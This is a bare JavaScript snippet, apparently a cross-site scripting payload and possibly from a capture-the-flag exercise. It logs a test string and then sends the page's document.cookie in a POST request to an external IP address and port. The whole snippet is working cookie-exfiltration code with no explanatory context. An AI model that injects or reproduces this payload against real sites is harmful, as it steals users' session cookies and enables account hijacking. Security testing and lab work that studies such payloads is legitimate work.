console.log("a");
fetch('http://94.237.63.93:57877/submit', {
    method: 'POST',
    body: JSON.stringify({
        message: document.cookie,
    }),
    headers: {
        'Content-Type': 'application/json',
    },
})
